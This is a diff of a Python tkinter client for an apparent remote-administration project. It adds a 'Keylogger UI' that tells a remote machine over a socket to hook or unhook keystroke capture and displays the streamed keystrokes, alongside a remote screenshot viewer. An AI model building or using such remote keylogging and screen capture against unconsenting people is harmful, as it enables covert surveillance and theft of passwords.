@@ -1,5 +1,5 @@
 import tkinter as tk
-from tkinter import messagebox,filedialog
+from tkinter import messagebox,filedialog,scrolledtext
 import socket
 import os
 from PIL import Image, ImageTk, ImageGrab
@@ -57,13 +57,55 @@ def submit_button_click(event=None):
     connect(user_input)
     InputTextbox.delete(0, tk.END)
 
-def FixRegistry():
-    send_command("FixRegistry")
-    print("Fixing Registry...")
+#####################################################################
+# Send keystroke
 
-def Handle_send_keystroke():
-    pass
+def CreateUI_SendKeyStroke():
+    def hook():
+        command = "HOOK"
+        client_socket.sendall(command.encode())
+        while True:
+            data = client_socket.recv(1024).decode()
+            text_area.insert(tk.END, data)
+    def unhook():
+        command = "UNHOOK"
+        client_socket.sendall(command.encode())
+    def print_logs():
+        logs = text_area.get("1.0", tk.END)
+        print(logs)
 
+    def delete_logs():
+        text_area.delete("1.0", tk.END)
+
+    # Create the main window
+    KeyStrokeRoot = tk.Tk()
+    KeyStrokeRoot.title("Keylogger UI")
+    KeyStrokeRoot.geometry("800x600")
+
+    # Create buttons
+    hook_button = tk.Button(KeyStrokeRoot, text="Hook", command=hook)
+    unhook_button = tk.Button(KeyStrokeRoot, text="Unhook", command=unhook)
+    print_button = tk.Button(KeyStrokeRoot, text="Print Logs", command=print_logs)
+    delete_button = tk.Button(KeyStrokeRoot, text="Delete Logs", command=delete_logs)
+
+    # Create a scrolled text area
+    text_area = scrolledtext.ScrolledText(KeyStrokeRoot, width=70, height=20)
+
+    # Place buttons and text area in the UI
+    hook_button.pack(pady=10)
+    unhook_button.pack(pady=10)
+    print_button.pack(pady=10)
+    delete_button.pack(pady=10)
+    text_area.pack(pady=20)
+    KeyStrokeRoot.mainloop()
+
+def Handle_send_keystroke():    
+    CreateUI_SendKeyStroke()
+
+#####################################################################
+# Screenshot
+
+#1: Open the system's file manager for the user to input the file's name
 def SaveImage(image_path):
     image = Image.open(image_path)
     file_path = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG files", "*.png")])
@@ -76,6 +118,7 @@ def SaveImage(image_path):
         except OSError as e:
             print(f"Error deleting image: {e}")
 
+#2: Used for updating the picture constantly
 def TakePictureButtonFunction():
     command = "TakeScreenShot"
     client_socket.sendall(command.encode())
@@ -83,31 +126,33 @@ def TakePictureButtonFunction():
 
     new_image = Image.open("received_image.png")
     new_image = new_image.resize((600, 450), Image.LANCZOS)
-    new_photo = ImageTk.PhotoImage(new_image, master=root2)
+    new_photo = ImageTk.PhotoImage(new_image, master=ScreenShotRoot)
     label.config(image=new_photo)
     label.image = new_photo
 
+#3: Create a UI for this feature
 def display_image(image_path):
-    global root2
-    root2 = tk.Tk()
-    root2.title("Captured Image")
-    root2.geometry("800x600")
-    root2.resizable(False, False)
+    global ScreenShotRoot
+    ScreenShotRoot = tk.Tk()
+    ScreenShotRoot.title("Captured Image")
+    ScreenShotRoot.geometry("800x600")
+    ScreenShotRoot.resizable(False, False)
 
     image = Image.open(image_path)
     image = image.resize((600, 450), Image.LANCZOS)  # Resize the image using LANCZOS resampling
-    photo = ImageTk.PhotoImage(image, master = root2)
+    photo = ImageTk.PhotoImage(image, master = ScreenShotRoot)
     global label
-    label = tk.Label(root2, image=photo)
+    label = tk.Label(ScreenShotRoot, image=photo)
     label.pack()
 
-    take_picture_button = tk.Button(root2, text="Take Picture", command=lambda: TakePictureButtonFunction())
+    take_picture_button = tk.Button(ScreenShotRoot, text="Take Picture", command=lambda: TakePictureButtonFunction())
     take_picture_button.pack()
 
-    save_button = tk.Button(root2, text="Save", command=lambda: SaveImage(image_path))
+    save_button = tk.Button(ScreenShotRoot, text="Save", command=lambda: SaveImage(image_path))
     save_button.pack()
-    root2.mainloop()
+    ScreenShotRoot.mainloop()
 
+#4: Listen and receive image through TCP connection
 def ReceiveImage(image_path="received_image.png"):
     file = open(image_path, "wb")
     isBreak = False;
@@ -123,22 +168,32 @@ def ReceiveImage(image_path="received_image.png"):
     file.close()
     print("picture received")
 
+#5: main function for this task
 def Handle_take_screenshot():
     ReceiveImage()
     display_image("received_image.png")
 
+#####################################################################
+# App running 
 def Handle_app_running_check():
     pass
 
+#####################################################################
+# Process running
 def Handle_process_running_check():
     pass
 
+#####################################################################
+# Shutdown
 def Handle_shutdown_computer():
     pass
 
+#####################################################################
+# Fix Registry
 def Handle_fix_registry():
     pass
 
+#####################################################################
 # Building the Client UI
 root = tk.Tk()
 root.geometry("650x550")
